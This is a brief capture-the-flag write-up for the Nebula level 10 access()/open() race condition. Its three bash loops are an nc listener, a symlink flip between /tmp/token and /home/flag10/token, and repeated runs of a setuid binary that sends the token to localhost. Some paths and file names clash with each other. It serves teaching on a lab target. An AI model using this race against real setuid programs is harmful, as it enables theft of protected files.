## Docker9:Assecc to the race condition
* finish in 191010
* what question when finish it  
1.*use nc to establish monitor:nc -l -p 18211,the -l must in the front of -p*  
2.*ln -s is used to establish a soft link,the right is different from the original file,for example,chmod u+s the soft link file,you can't read the original file,but hard link can do it,if you want to do it use soft link,you should use readlink(c language) to get the original file*  
3.*access and open:after access and before open,you can change the file use 2*
* introduction:  
*reference<https://github.com/1u4nx/Exploit-Exercises-Nebula/blob/master/Level10%E2%80%94%E2%80%94%E8%AE%BF%E9%97%AE%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E.org>,answer this item,you need open three window.*  
> step 1:  
> \>>cd /tmp  
> \>>vim xx:  
> ```
>	#! /bin/bash
>	while true
>	do
>		nc -l -p 18211
>	done
>  ```
> \>>chmod +x xx;./x  

> step 2:  
> \>>cd /tmp  
> \>>touch /token  
> \>>vim yy:  
> ``` 
>	#! /bin/bash
>	while true
>	do
>		ln -fs /tmp/token /tmp/token10
>		ln -fs /home/flag10/token /tmp/token10
>	done
>```
> \>>chmod +x yy;./yy  

> step 3:  
> \>>cd /tmp  
> \>>vim zz  
> ```
>	#! /bin/bash
>	while true
>	do
>		nice -n 19 /home/flag19/demo /tmp/token10 127.0.0.1
>	done
> ```
> \>>chmod +x zz;./zz  
